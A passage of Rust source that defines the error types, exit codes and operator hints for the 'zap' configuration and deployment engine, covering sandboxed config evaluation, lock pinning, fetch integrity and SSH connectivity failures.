//! Error type for the `zap_core` engine.

use std::borrow::Cow;
use std::fmt;

use thiserror::Error;
use zap_types::error_code::{ErrorCode, NO_EXIT_CODE, classify_error};

use crate::escape::{escape_line, render_block};
use crate::secret::SecretMasker;

/// Errors from the convergence engine.
#[derive(Debug, Error)]
pub enum Error {
    /// No `fgro` binary is named: neither `--fgro` nor `ZAP_FGRO`. `fgro` evaluates
    /// every `zap.ts`; see [`Error::hint`] for where to name it.
    #[error("no fgro binary to evaluate the config with")]
    FgroUnset,

    /// The `fgro` binary is named by a path that isn't absolute.
    #[error("{from} must name the fgro binary by an absolute path")]
    FgroNotAbsolute {
        /// Which setting named it: `--fgro` or `ZAP_FGRO`.
        from: &'static str,
    },

    /// The `fgro` binary can't be pinned or run: missing, a link or a script, set-ID,
    /// written while it was hashed or since, or unreachable through `/proc`. The
    /// message is `fuz_eval`'s; [`Error::hint`] adds where zap's setting is, by
    /// `problem`.
    #[error("{message}")]
    FgroUnusable {
        /// What is wrong with it.
        problem: fuz_eval::FgroProblem,
        /// The refusal, as `fuz_eval` words it.
        message: String,
    },

    /// The `fgro` binary doesn't hash to the project's toolchain pin in `zap.lock`.
    #[error("{message}")]
    FgroPinMismatch {
        /// The refusal, as `fuz_eval` words it: the path and both hashes.
        message: String,
    },

    /// The `fgro` pin cache directory under `~/.zap` breaks its rule (it must be this
    /// user's own).
    #[error("{0}")]
    FgroPinCache(String),

    /// `fgro` answered in an eval protocol or graph version this zap doesn't read: the
    /// two were built from versions that don't speak to each other, and a retry runs the
    /// same binary. Nothing it wrote is used.
    #[error("{message}")]
    FgroProtocolVersion {
        /// The refusal, as `fuz_eval` words it: the config, the version found, and fgro's
        /// stderr.
        message: String,
    },

    /// `fgro` crashed, wrote output that isn't its protocol, or couldn't be read or
    /// spawned. Nothing it wrote is used.
    #[error("{0}")]
    FgroRun(String),

    /// The config's lock pins no toolchain — there is no lock, or no `zap lock` has
    /// pinned one in it — so there is no `fgro` build to evaluate it with.
    #[error("{lock} pins no fgro build to evaluate the config with")]
    ToolchainUnpinned {
        /// The lock's path.
        lock: String,
    },

    /// The config file couldn't be resolved on disk.
    #[error("config not found: {path} ({source})")]
    ConfigNotFound {
        /// The config path as given on the CLI.
        path: String,
        /// The underlying filesystem error.
        source: std::io::Error,
    },

    /// `fgro` evaluated the config and reported a failure — a config that threw, an
    /// import that didn't resolve, a syntax error, a read outside its box, its
    /// timeout. `kind` is `fgro`'s, the contract to branch on; [`Error::hint`] words
    /// `fgro`'s hint for a zap user.
    #[error("{}", eval_message(path, *kind, message, stderr))]
    ConfigEval {
        /// The evaluated config's absolute path.
        path: String,
        /// The kind of failure.
        kind: fuz_eval::EvalErrorKind,
        /// `fgro`'s report, with where it failed and the import, when it gave them.
        message: String,
        /// `fgro`'s hint, as it wrote it.
        fgro_hint: Option<String>,
        /// `fgro`'s captured stderr: the config's console output and `fgro`'s own
        /// diagnostics.
        stderr: String,
    },

    /// The config-eval subprocess emitted JSON that didn't match the schema.
    #[error("config did not match the zap schema ({path}): {source}")]
    ConfigParse {
        /// The evaluated config's absolute path.
        path: String,
        /// Why the JSON isn't a config.
        source: zap_types::schema::WireError,
    },

    /// `fgro` didn't stop at its timeout and was killed past `fuz_eval`'s grace — a
    /// process that doesn't stop. A run `fgro` stopped itself is an
    /// [`Error::ConfigEval`] of kind `timeout`.
    #[error("config evaluation timed out for {path}")]
    ConfigEvalTimeout {
        /// The evaluated config's absolute path.
        path: String,
    },

    /// `fgro` wrote more stdout than the capture cap, and was killed at it.
    #[error("config evaluation output exceeded {limit} bytes for {path}")]
    ConfigEvalOutputTooLarge {
        /// The evaluated config's absolute path.
        path: String,
        /// The stdout byte cap that was exceeded.
        limit: u64,
    },

    /// The config's project — the trust root `fgro`'s box is bounded by — could not
    /// be settled, so the evaluation was refused before `fgro` ran: the config file
    /// or its directory is writable by every user, a `package.json` on the way up
    /// can't be read or isn't valid, or no `package.json` sets a project below where
    /// the walk stopped. The message names the file or directory; [`Error::hint`]
    /// says what to change, by `problem`.
    #[error("{message}")]
    ConfigTrustRoot {
        /// What is wrong.
        problem: fuz_eval::TrustRootProblem,
        /// The refusal, as `fuz_eval` words it.
        message: String,
    },

    /// There is no user `fgro` may run the config as: it never runs as root, and drops
    /// from root only to the project's owner. The message names why; [`Error::hint`]
    /// says what to change, by `problem`.
    #[error("{message}")]
    ConfigRunAs {
        /// What refuses it.
        problem: fuz_eval::RunAsProblem,
        /// The refusal, as `fuz_eval` words it.
        message: String,
    },

    /// An IO error walking to the config's project or communicating with `fgro`.
    #[error("config evaluation IO error: {0}")]
    ConfigIo(#[source] std::io::Error),

    /// The `--env-file` couldn't be read: it is missing or unreadable, or holds a line
    /// zap doesn't read (`crate::resolve::EnvFileProblem` — the line and the variable,
    /// never a value). Its `NAME=VALUE` pairs overlay the operator env that references
    /// and secrets resolve against, so either is a hard startup error, not a silent
    /// miss.
    #[error("failed to read env file {path}: {message}")]
    EnvFile {
        /// The `--env-file` path as given on the CLI.
        path: String,
        /// The filesystem error, or the line that isn't read and why.
        message: String,
    },

    /// A config that parsed but is invalid for the requested operation (e.g. a remote
    /// target with no `host`). Distinct from [`Error::ConfigParse`] (a serde-shape
    /// failure) — this is a semantic check after parsing.
    #[error("invalid config: {0}")]
    Config(String),

    /// `--expect-plan` without `--wetrun`: the flag binds a wetrun to a reviewed plan,
    /// and a dry run binds nothing. A usage error, raised before the config is read.
    #[error(
        "--expect-plan binds a wetrun to a reviewed plan; a dry run only previews (add \
         --wetrun)"
    )]
    ExpectPlanWithoutWetrun,

    /// A wetrun zap declined before its first change, by design: a reference the config
    /// makes is unset or empty, the plan names no one machine, a planned command can't
    /// take a value its reference resolves to, or a reference moved while the run was in
    /// progress. The message says which; the config itself may be sound.
    #[error("{0}")]
    WetrunRefused(String),

    /// The config's file name is the one its lock would have (`*.lock`, which
    /// [`crate::lock::lock_path_for`] maps to itself), so writing the lock would write
    /// over the config. Refused before the config is evaluated.
    #[error(
        "the config `{path}` has the name its own lock file would have (the config's name \
         with the extension `.lock`), so the lock would be written over it — give the \
         config another extension"
    )]
    ConfigNamedLikeLock {
        /// The config path as given.
        path: String,
    },

    /// A local command subprocess couldn't be spawned or awaited (the command
    /// running is a successful call with `success == false`, not this error).
    #[error("failed to run command: {0}")]
    Command(#[source] std::io::Error),

    /// The operator's working tree gave no usable git answer (`deploy` versions a
    /// release by the committed short hash). An environment/prerequisite failure —
    /// not a `zap.ts` problem, so not [`Error::Config`] — that a retry from the right
    /// checkout clears.
    #[error("git failed: {0}")]
    Git(String),

    /// Neither `ZAP_HOME` nor `HOME` resolves, so zap has no state directory for the
    /// content cache the lock verbs resolve through. A prerequisite failure of the
    /// operator environment, not of the config.
    #[error("no zap home: set ZAP_HOME (or HOME) so zap has a state directory")]
    ZapHomeUnset,

    /// `ZAP_HOME` or `HOME` holds a relative path. Joined onto, it would name a
    /// directory under wherever zap is run — its state, or a file a config manages,
    /// would land there — so it is refused rather than used.
    #[error(
        "`{var}` is set to a relative path, which would name a directory under wherever \
         zap is run — set it to an absolute path"
    )]
    HomeNotAbsolute {
        /// The environment variable.
        var: &'static str,
    },

    /// A directory under zap's home is not zap's own: a symlink, something that is no
    /// directory, a directory of another user's, or one that can't be opened. The
    /// records kept there decide what a run does, so nothing is read from or written
    /// through it.
    #[error("zap keeps its state in directories of its own, and {path} {found}")]
    StateDir {
        /// The path that isn't zap's own.
        path: String,
        /// What stands there and what to do about it, as a clause after the path.
        found: String,
    },

    /// The recorded preview couldn't be withdrawn before a wetrun executed. Left in
    /// place it would bind a second wetrun to the review this one spent, so the wetrun
    /// stops before its first change.
    #[error(
        "could not withdraw the recorded {} at {path} ({message}) — nothing was {}; \
         remove the file, then preview again with `{}` (or pass --expect-plan): the \
         review this wetrun bound to goes with the file",
        .of.record(),
        .of.done(),
        .of.command()
    )]
    PreviewWithdraw {
        /// Whose preview it is.
        of: Previewed,
        /// The record's path under `~/.zap`.
        path: String,
        /// The underlying filesystem error.
        message: String,
    },

    /// The preview a wetrun bound to was gone when the wetrun came to withdraw it, or
    /// had been replaced by a preview of another plan: another run withdrew it first,
    /// and one review covers one execution. The wetrun stops before its first change.
    #[error(
        "the {} this wetrun bound to was withdrawn or replaced by another run before \
         this one's first {} — this run {} nothing; preview again with `{}`, or pass \
         --expect-plan",
        .of.record(),
        .of.first(),
        .of.done(),
        .of.command()
    )]
    PreviewSpent {
        /// Whose preview it was.
        of: Previewed,
    },

    /// A `deploy` wetrun from a working tree with uncommitted changes or untracked files
    /// and no `--force`: the release would ship the tree under the commit's version.
    /// Raised before the target is contacted.
    #[error("{} — nothing ran", crate::commands::deploy::DIRTY_NEEDS_FORCE)]
    DirtyTree,

    /// `zap deploy` found the target's `current` link naming no release
    /// (`releases/<version>`), so it knows no live release to keep, prune around, or
    /// roll back to. Raised before anything is built or sent.
    #[error(
        "{0} — nothing ran: point `current` at the live release (`ln -sfn \
         releases/<version> current` in the app path), or remove it to deploy as onto a \
         fresh host"
    )]
    LiveReleaseUnknown(String),

    /// A [`crate::connection::Connection::Mock`] was asked to run a command it has
    /// no recording for — a test-fixture gap, surfaced loudly rather than passing.
    #[error("mock connection has no recorded output for command: {0}")]
    MockCommand(String),

    /// An SSH target couldn't be reached: a detection batch's `ssh` couldn't start or
    /// exited 255, or `ssh true` (`Connection::check_connectivity` — a detection pass
    /// with nothing to batch, and `deploy` before it acts) couldn't start or exited
    /// nonzero; or zap refused to connect because the operator's `ssh` config, as
    /// `ssh -G` prints it, leaves host keys unchecked. Raised before any verdict or
    /// execution.
    #[error("cannot connect to {target}: {message}")]
    Connectivity {
        /// The target label (`ssh://user@host`).
        target: String,
        /// The failure reason: what `ssh` said.
        message: String,
        /// The host, as the connection resolved it, when `ssh` reported that its key
        /// changed: what zap's own advice for this failure — the error's
        /// [`hint`](Error::hint) — names. The advice is kept out of the message so that
        /// nothing `ssh` or the server said can stand beside it as zap's words, and the
        /// host is kept as it is so that it is masked before it is escaped.
        changed_host_key: Option<String>,
    },

    /// A **remote** target's path field references `~` / `$HOME` but no `target.home`
    /// is declared, so the home can't be resolved (zap declines to guess the remote
    /// filesystem layout — declare `target.home` or use an absolute path).
    #[error(
        "remote path `{path}` references the target home, but `target.home` is not set \
         (declare it, or use an absolute path)"
    )]
    RemoteHomeUnset {
        /// The unresolvable path as declared.
        path: String,
    },

    /// A **local** target's path field references `~` / `$HOME` and `HOME` is unset or
    /// empty, so there is no home to resolve it against (zap guesses none — no `/root`,
    /// no password-database lookup).
    #[error(
        "local path `{path}` references the home directory, but `HOME` is unset or empty \
         (set it, or use an absolute path)"
    )]
    LocalHomeUnset {
        /// The unresolvable path as declared.
        path: String,
    },

    /// A reference in a path, or in a name zap reads the target by, resolves to a value
    /// that field can't hold (a NUL, a reference delimiter). Names the variable, never
    /// the value. Detection holds the one resource that takes it.
    #[error("{0}")]
    UnusableValue(#[source] crate::resolve::UnsafeValue),

    /// Reading a file's content failed — a permission error the `sudo` fallback
    /// couldn't clear, a vanished file, or a `cat` failure over the connection.
    /// Detectors localize this to a failed detection rather than aborting the run.
    #[error("failed to read file {path}: {cause}")]
    ReadFile {
        /// The path that couldn't be read.
        path: String,
        /// The underlying failure: the native read's io error, or stderr or a short
        /// reason.
        cause: FailureCause,
    },

    /// A filesystem operation during execution (write / mkdir / symlink / chmod /
    /// chown) failed — both the native attempt and the privileged `sudo` fallback.
    #[error("failed to {op} {path}: {cause}")]
    FileOp {
        /// The operation that failed (`write` / `mkdir` / `symlink` / `chmod` / `chown`).
        op: &'static str,
        /// The target path.
        path: String,
        /// The underlying failure: the native call's io error, or stderr or a short
        /// reason.
        cause: FailureCause,
    },

    /// Computing a resource's `config_hash` failed (a typed view didn't match the
    /// resource's config fields).
    #[error("failed to compute config hash: {0}")]
    ConfigHash(#[source] serde_json::Error),

    /// Hashing the plan fact failed (the `Plan` couldn't be serialized to JSON).
    #[error("failed to compute plan hash: {0}")]
    PlanHash(#[source] serde_json::Error),

    /// A secret-subsystem failure — a registered value that holds a masking token, an
    /// `unmask` of a fetch credential, or a resolved secret value found as a literal in
    /// the config.
    #[error("{0}")]
    Secret(String),

    // --- Content resolution (`zap.file remote` / `build` sources) ---
    // Split by failure mode so a consumer can branch (a retry policy, a security
    // alert) without string-matching. Two are **integrity** failures — a tampered or
    // wrong artifact, never safe to retry: [`Error::ContentHashMismatch`] and
    // [`Error::SignatureVerification`]. The rest are operational (network, local IO,
    // config). Each names its location by the url as the config declares it — references
    // intact, never a resolved value — so an error can be printed as it is.
    /// Integrity: the fetched bytes' blake3 didn't match the declared/lock pin — a
    /// tampered or wrong upstream artifact. **Never** retry; the pin or the upstream is
    /// wrong.
    #[error("content hash mismatch for {url}: declared {declared}, fetched {fetched}")]
    ContentHashMismatch {
        /// The fetch location, as declared.
        url: String,
        /// The pin the config/lock declared.
        declared: String,
        /// The hash the fetched bytes actually produced.
        fetched: String,
    },

    /// Integrity: upstream-signature verification (minisign) could not establish the
    /// fetched source is authentic — a bad signature, a missing `minisign`, or a
    /// staging failure. **Fail closed**: the artifact is not trusted regardless of
    /// which sub-step failed.
    #[error("signature verification failed for {url}: {message}")]
    SignatureVerification {
        /// The source being verified, as declared.
        url: String,
        /// The verification sub-failure (bad signature, tool missing, staging error).
        message: String,
    },

    /// Operational: fetching content over the network failed — a transport error, a
    /// non-success HTTP status, or an HTTP-client build failure. Often transient.
    #[error("failed to fetch {url}: {message}")]
    Fetch {
        /// The fetch location, as declared.
        url: String,
        /// The transport/HTTP detail.
        message: String,
    },

    /// Config: a fetch url references a variable that is unset or empty. zap refuses
    /// the fetch: the reference would resolve to nothing, the request would go to
    /// another url, and its bytes would be pinned or installed as this one's.
    #[error("cannot fetch {url}: {vars} unset or empty in the environment — set it and re-run")]
    FetchVarUnset {
        /// The fetch location, as declared.
        url: String,
        /// The unset variables' names (comma-joined for display).
        vars: String,
    },

    /// Config: a private byte-host fetch credential's token reference resolved empty
    /// (the var is unset) — zap refuses to send a bogus `Bearer ` header.
    #[error(
        "auth credential for {url} resolved empty — is the variable its token references \
         set in the environment?"
    )]
    AuthUnset {
        /// The fetch location, as declared, whose credential resolved empty.
        url: String,
    },

    /// Operational: writing fetched bytes to the content cache under `<zap_home>`
    /// failed (create-dir, temp-write, or rename) — a local-filesystem error.
    #[error("content cache write failed for {path}: {source}")]
    CacheWrite {
        /// The cache path that couldn't be written.
        path: String,
        /// The underlying filesystem error.
        source: std::io::Error,
    },

    /// Internal: a resource reached the lock's minting that isn't the tracked kind it expects
    /// (callers must pass only lock-eligible resources). A guard, not an operator error.
    #[error("resource `{id}` is not {expected}")]
    EntryNotResolvable {
        /// The resource id.
        id: String,
        /// What the resolver expected (`lock-eligible`).
        expected: &'static str,
    },

    /// An IO error reading or writing `zap.lock` (the flock guard, the read, or the
    /// atomic temp+rename write).
    #[error("lock IO error for {path}: {source}")]
    LockIo {
        /// The lock file path.
        path: String,
        /// The underlying filesystem error.
        source: std::io::Error,
    },

    /// `zap.lock` couldn't be parsed as the lock schema.
    #[error("zap.lock did not match the lock schema ({path}): {source}")]
    LockParse {
        /// The lock file path.
        path: String,
        /// The deserialization error.
        source: serde_json::Error,
    },

    /// `zap.lock` was written by a newer zap whose format this binary can't read
    /// (strict-schema discipline — no partial parse of an unknown shape).
    #[error(
        "zap.lock at {path} is format version {found}, but this zap supports up to \
         {supported} — upgrade zap to read it"
    )]
    LockVersion {
        /// The lock file path.
        path: String,
        /// The version found in the file.
        found: u32,
        /// The newest version this binary understands.
        supported: u32,
    },

    /// A resource's lock entry no longer matches its config (the config — or a
    /// non-secret reference its address resolves — changed since the pin was recorded). zap never
    /// auto-reconciles to the lock: the operator runs `zap update <id>`.
    #[error(
        "lock entry for `{id}` is stale (config changed since it was pinned) — run `zap update {id}`"
    )]
    LockStale {
        /// The resource id whose entry is stale.
        id: String,
    },

    /// A lock entry's `config_hash` can't be recomputed, or minted, because a variable
    /// its address depends on is unset in the current env: a non-secret reference in
    /// its hash-relevant fields, or a secret the config references that a plain value
    /// there could hold. zap **fails closed** rather than fold an empty value, or a
    /// secret unmasked — set the var (the env the pin was minted with) and re-run.
    #[error(
        "lock entry for `{id}` cannot be verified — unset {vars}, which its \
         url/path address depends on; set it (the env the lock was minted with) and re-run"
    )]
    LockUnverifiable {
        /// The resource id whose entry can't be verified.
        id: String,
        /// The unset variables' names blocking verification (comma-joined for display).
        vars: String,
    },
}

/// The command whose recorded preview a wetrun binds to: `zap apply`'s (the host's
/// last-run report) or `zap deploy`'s (the deploy preview).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Previewed {
    /// `zap apply`'s.
    Apply,
    /// `zap deploy`'s.
    Deploy,
}

impl Previewed {
    /// The record, as a message names it.
    const fn record(self) -> &'static str {
        match self {
            Self::Apply => "preview",
            Self::Deploy => "deploy preview",
        }
    }

    /// The command that records a preview.
    const fn command(self) -> &'static str {
        match self {
            Self::Apply => "zap apply",
            Self::Deploy => "zap deploy",
        }
    }

    /// What a wetrun does to the target, in the past tense.
    const fn done(self) -> &'static str {
        match self {
            Self::Apply => "changed",
            Self::Deploy => "deployed",
        }
    }

    /// The unit of a wetrun's work.
    const fn first(self) -> &'static str {
        match self {
            Self::Apply => "change",
            Self::Deploy => "step",
        }
    }
}

/// Why a file operation or a read failed, as [`Error::FileOp`] and [`Error::ReadFile`]
/// carry it.
///
/// The io error of a native call classifies by its kind; a script stopped at its
/// deadline is a timeout; a command or script that exited classifies by its exit status
/// and what it printed; text with no exit status beside it — what a command printed when
/// its status isn't kept, or zap's own reason — classifies only by its words. Each
/// renders as it reads.
#[derive(Debug)]
pub enum FailureCause {
    /// The io error a native call returned, as it returned it — its kind and OS code
    /// kept. zap's own native file operations give some of theirs a kind and words of
    /// their own (`connection::local_put`'s refusals, a link put where a directory
    /// stands); none stands for a script's outcome.
    Io(std::io::Error),
    /// A script that ran past its deadline and was stopped, in zap's words.
    TimedOut(String),
    /// A command or script that ran and exited `code`, with what it printed on its
    /// stderr (trimmed) — the words it renders as.
    Exited {
        /// What it printed on its stderr, trimmed.
        stderr: String,
        /// Its exit status.
        code: i32,
    },
    /// A command's stderr with no exit status kept, or zap's own words.
    Text(String),
}

impl FailureCause {
    /// The triage code of the failure: [`io_error_code`] of a native call's error,
    /// transient for a timeout, [`classify_error`] of an exit status and what was
    /// printed, and of text.
    #[must_use]
    pub fn error_code(&self) -> ErrorCode {
        match self {
            Self::Io(error) => io_error_code(error),
            Self::TimedOut(_) => ErrorCode::Transient,
            Self::Exited { stderr, code } => classify_error(stderr, *code),
            Self::Text(text) => classify_error(text, NO_EXIT_CODE),
        }
    }
}

impl fmt::Display for FailureCause {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Io(error) => error.fmt(f),
            Self::TimedOut(text) | Self::Exited { stderr: text, .. } | Self::Text(text) => {
                f.write_str(text)
            }
        }
    }
}

impl From<std::io::Error> for FailureCause {
    fn from(error: std::io::Error) -> Self {
        Self::Io(error)
    }
}

/// The triage code of a native io error, read from what the OS said rather than from
/// the words.
///
/// Its OS code decides where the kind can't tell (`ELOOP`, a symbolic link where none
/// is followed, which has no stable kind of its own), else its kind. A kind that says
/// nothing to triage by — `Other`, `InvalidInput`, and the rest, among them zap's own
/// refusals — is classified by its message ([`classify_error`]).
#[must_use]
pub fn io_error_code(error: &std::io::Error) -> ErrorCode {
    use std::io::ErrorKind as K;
    if error.raw_os_error() == Some(nix::libc::ELOOP) {
        return ErrorCode::Conflict;
    }
    match error.kind() {
        K::PermissionDenied => ErrorCode::Permission,
        K::NotFound => ErrorCode::NotFound,
        // something stands in the way, or the device is full
        K::AlreadyExists
        | K::AddrInUse
        | K::ResourceBusy
        | K::ExecutableFileBusy
        | K::NotADirectory
        | K::IsADirectory
        | K::DirectoryNotEmpty
        | K::StorageFull
        | K::QuotaExceeded => ErrorCode::Conflict,
        K::TimedOut
        | K::ConnectionRefused
        | K::ConnectionReset
        | K::ConnectionAborted
        | K::NotConnected
        | K::NetworkUnreachable
        | K::HostUnreachable
        | K::NetworkDown => ErrorCode::Transient,
        _ => classify_error(&error.to_string(), NO_EXIT_CODE),
    }
}

/// [`Error::ConfigEval`]'s message: `fgro`'s report under zap's line, then its
/// stderr when it wrote any. Raw: [`Error::render`] escapes every line.
fn eval_message(path: &str, kind: fuz_eval::EvalErrorKind, message: &str, stderr: &str) -> String {
    let mut out = format!("config evaluation failed for {path} ({kind}): {message}");
    let stderr = stderr.trim_end_matches('\n');
    if !stderr.is_empty() {
        out.push_str("\nstderr:\n");
        out.push_str(stderr);
    }
    out
}

/// The hint for every refusal under `sudo` that names where zap's `fgro` setting is.
const FGRO_SETTING_HINT: &str = "Name the fgro build with `--fgro <path>`, or `ZAP_FGRO` in the \
                                 environment (sudo resets the environment, so under sudo only \
                                 `--fgro` reaches zap). Point it at a copy you update \
                                 deliberately, such as ~/.zap/bin/fgro.";

/// What to change for a [`Error::ConfigTrustRoot`], by what is wrong.
const fn trust_root_hint(problem: fuz_eval::TrustRootProblem) -> &'static str {
    use fuz_eval::TrustRootProblem as P;
    match problem {
        P::WorldWritableConfigDir => {
            "Any user can put a package.json or a node_modules beside a config in a directory \
             every user can write, and zap would load from it.\n\
             Remove the write bit for others (`chmod o-w` on that directory), or move the \
             config into a directory you own."
        }
        P::WorldWritableConfigFile => {
            "Any user can change a config file every user can write, and zap would run what \
             they put there.\n\
             Remove the write bit for others (`chmod o-w` on the config file the message \
             names)."
        }
        P::InvalidPackageJson => {
            "zap reads every package.json between the config and its project to find the \
             project, and won't guess past one it can't read.\n\
             Make it readable, and a JSON object whose \"name\" and \"type\", where present, \
             are strings — or remove it."
        }
        P::WalkStopped(fuz_eval::WalkStop::WorldWritable) => {
            "A config is evaluated in its project: the nearest directory at or above it whose \
             package.json holds more than \"type\" and \"sideEffects\". The walk up to it \
             stopped below a directory every user can write (the message names it).\n\
             Give the config a package.json of its own, move the project out of that \
             directory, or `chmod o-w` it if it's yours."
        }
        P::WalkStopped(fuz_eval::WalkStop::OtherOwner) | P::NoProject => {
            "A config is evaluated in its project: the nearest directory at or above it whose \
             package.json holds more than \"type\" and \"sideEffects\", among directories \
             you own that no other user can write.\n\
             Give the config a project: a package.json beside it (`{\"name\": \"infra\", \
             \"private\": true}`), or move it into one."
        }
    }
}

/// What to change for a [`Error::ConfigRunAs`], by what refuses it.
const fn run_as_hint(problem: &fuz_eval::RunAsProblem) -> Option<&'static str> {
    use fuz_eval::RunAsProblem as P;
    match problem {
        P::RootOwnedProject { .. } => Some(
            "zap evaluates a config only as a user who could already edit it, never as \
             root: run zap as the project's owner, with sudo for the target's privileged \
             commands rather than for zap itself, or give the project to that user.",
        ),
        P::HomeProject { .. } => Some(
            "The config's project is a home directory, which its evaluation could read \
             all of: give the config a directory of its own, with a package.json beside it.",
        ),
        P::SudoGidUnusable { .. }
        | P::RootGroup { .. }
        | P::NoPasswdEntry { .. }
        | P::PasswdUnreadable { .. }
        | P::NotSearchable { .. } => None,
    }
}

impl Error {
    /// Process exit code for this error, for the `zap` binary's `main`.
    ///
    /// `2` = **needs-action**: re-running unchanged would fail identically, so the
    /// operator must first fix the invocation, the config, the lock, or a credential /
    /// env var (integrity failures included — a stale pin or a tampered/wrong artifact
    /// won't pass on a bare retry). `1` = an operational failure a retry might clear
    /// (transient network / IO, a failed command, an unreachable host) or an internal
    /// guard. The drift codes (`0` converged / `2` dry-run drift) are the report types'
    /// (`ApplyReport` / `DeployReport`), not this error path's.
    #[must_use]
    pub const fn exit_code(&self) -> u8 {
        match self {
            // Needs-action: fix config / lock / credentials / env, name fgro (or one that
            // speaks this zap's eval protocol), or correct a wrong-or-tampered pinned
            // artifact — a bare re-run can't help.
            Self::FgroUnset
            | Self::FgroNotAbsolute { .. }
            | Self::FgroPinMismatch { .. }
            | Self::FgroProtocolVersion { .. }
            | Self::FgroPinCache(_)
            | Self::ToolchainUnpinned { .. }
            | Self::ConfigNotFound { .. }
            | Self::ConfigEval { .. }
            | Self::ConfigParse { .. }
            | Self::ConfigEvalTimeout { .. }
            | Self::ConfigEvalOutputTooLarge { .. }
            | Self::ConfigTrustRoot { .. }
            | Self::ConfigRunAs { .. }
            | Self::EnvFile { .. }
            | Self::Config(_)
            | Self::ExpectPlanWithoutWetrun
            | Self::WetrunRefused(_)
            | Self::ConfigNamedLikeLock { .. }
            | Self::ZapHomeUnset
            | Self::RemoteHomeUnset { .. }
            | Self::LocalHomeUnset { .. }
            | Self::HomeNotAbsolute { .. }
            | Self::StateDir { .. }
            | Self::UnusableValue(_)
            | Self::Secret(_)
            | Self::ContentHashMismatch { .. }
            | Self::SignatureVerification { .. }
            | Self::AuthUnset { .. }
            | Self::FetchVarUnset { .. }
            | Self::LockParse { .. }
            | Self::LockVersion { .. }
            | Self::LockStale { .. }
            | Self::LockUnverifiable { .. }
            | Self::PreviewSpent { .. }
            | Self::LiveReleaseUnknown(_)
            | Self::DirtyTree => 2,
            // A binary written while it was hashed or since: a retry once nothing writes
            // it may succeed. Anything else about it is the operator's to fix.
            Self::FgroUnusable { problem, .. } => match problem {
                fuz_eval::FgroProblem::ChangedWhileHashing
                | fuz_eval::FgroProblem::ChangedSincePin => 1,
                _ => 2,
            },
            // Operational (a retry may succeed) or an internal guard.
            Self::FgroRun(_)
            | Self::ConfigIo(_)
            | Self::Command(_)
            | Self::Git(_)
            | Self::PreviewWithdraw { .. }
            | Self::MockCommand(_)
            | Self::Connectivity { .. }
            | Self::ReadFile { .. }
            | Self::FileOp { .. }
            | Self::ConfigHash(_)
            | Self::PlanHash(_)
            | Self::Fetch { .. }
            | Self::CacheWrite { .. }
            | Self::EntryNotResolvable { .. }
            | Self::LockIo { .. } => 1,
        }
    }

    /// The triage code of a change that failed with this error, as a `change_failed`
    /// event carries it: from the io error's kind where the error holds one
    /// ([`io_error_code`]), from a file operation's or a read's cause
    /// ([`FailureCause::error_code`]), and otherwise from the message's words
    /// ([`classify_error`]) — what `ssh` said, a command's stderr, zap's own reason.
    #[must_use]
    pub fn error_code(&self) -> ErrorCode {
        match self {
            Self::FileOp { cause, .. } | Self::ReadFile { cause, .. } => cause.error_code(),
            Self::Command(source)
            | Self::ConfigIo(source)
            | Self::ConfigNotFound { source, .. }
            | Self::LockIo { source, .. }
            | Self::CacheWrite { source, .. } => io_error_code(source),
            other => classify_error(&other.to_string(), NO_EXIT_CODE),
        }
    }

    /// The text the binary prints for this error: the message as a block under `error: `
    /// ([`render_block`]), then the [`hint`](Self::hint) when there is one.
    ///
    /// An error quotes what it failed on — a path from the command line, a resource id
    /// or a variable name from the config, a command's stderr from the target — so the
    /// whole message is escaped here, whatever variant wrote it, and a message that runs
    /// to several lines keeps them indented under its first. A message's trailing
    /// newlines are dropped.
    #[must_use]
    pub fn render(&self) -> String {
        let mut out = String::new();
        render_block(&mut out, "error: ", self.to_string().trim_end_matches('\n'));
        if let Some(hint) = self.hint() {
            out.push_str(&hint);
            out.push('\n');
        }
        out
    }

    /// An actionable hint to print after the error message, when one applies: zap's own
    /// words, on lines that start at the margin — where no line of the message, indented
    /// under `error: `, can stand. A value it names (a host) is escaped here.
    #[must_use]
    pub fn hint(&self) -> Option<Cow<'_, str>> {
        match self {
            Self::Connectivity {
                changed_host_key, ..
            } => changed_host_key.as_deref().map(|host| {
                // A masked host is no argument to run: say what stands in for it.
                let remove = if zap_types::var_ref::masked_token_names(host).is_empty() {
                    format!("run `ssh-keygen -R {}`", escape_line(host))
                } else {
                    format!(
                        "run `ssh-keygen -R <host>` with the host that {} stands for",
                        escape_line(host)
                    )
                };
                Cow::Owned(format!(
                    "The server's host key changed — possible man-in-the-middle, or the \
                     server was reinstalled.\nIf you trust the new key, {remove} and retry."
                ))
            }),
            Self::FgroUnset | Self::FgroNotAbsolute { .. } => Some(Cow::Owned(format!(
                "zap evaluates every config with fgro, gro's sandboxed runtime.\n\
                 {FGRO_SETTING_HINT}"
            ))),
            // a missing binary's message already says so: only where to name another
            Self::FgroUnusable {
                problem: fuz_eval::FgroProblem::NotFound,
                ..
            } => Some(Cow::Borrowed(FGRO_SETTING_HINT)),
            Self::FgroUnusable { problem, .. } => crate::config::eval::fgro_unusable_hint(*problem)
                .map(|hint| Cow::Owned(format!("{hint}\n{FGRO_SETTING_HINT}"))),
            Self::FgroPinMismatch { .. } => Some(Cow::Borrowed(
                "The config's zap.lock pins another fgro build. If this build is the one to \
                 use, run `zap lock` to pin it; otherwise point `--fgro` or `ZAP_FGRO` at the \
                 pinned build.",
            )),
            Self::FgroProtocolVersion { .. } => Some(Cow::Borrowed(
                "This zap and the fgro build `--fgro` or `ZAP_FGRO` names speak different \
                 versions of the eval protocol, and a retry runs the same build. Update the \
                 older of the two (rebuild fgro from gro, or zap with `cargo xtask install`), \
                 then run `zap lock` to pin the fgro build.",
            )),
            Self::ToolchainUnpinned { .. } => Some(Cow::Borrowed(
                "Run `zap lock` to pin the fgro build `--fgro` or `ZAP_FGRO` names in the \
                 config's zap.lock, and commit it. `zap lock` also checks that the config \
                 has a project (a package.json beside it or above it), and says what is \
                 missing when it has none.",
            )),
            Self::ConfigEval {
                kind, fgro_hint, ..
            } => crate::config::eval::eval_hint(*kind, fgro_hint.as_deref()),
            Self::ConfigTrustRoot { problem, .. } => Some(Cow::Borrowed(trust_root_hint(*problem))),
            Self::ConfigRunAs { problem, .. } => run_as_hint(problem).map(Cow::Borrowed),
            _ => None,
        }
    }

    /// This error with every registered secret's value replaced by its `[MASKED:NAME]`
    /// token, in every text it carries.
    ///
    /// An error quotes what it failed on, and past the config gates that can be a value
    /// a reference resolved to: the `user@host` a connection was made to, a path, what
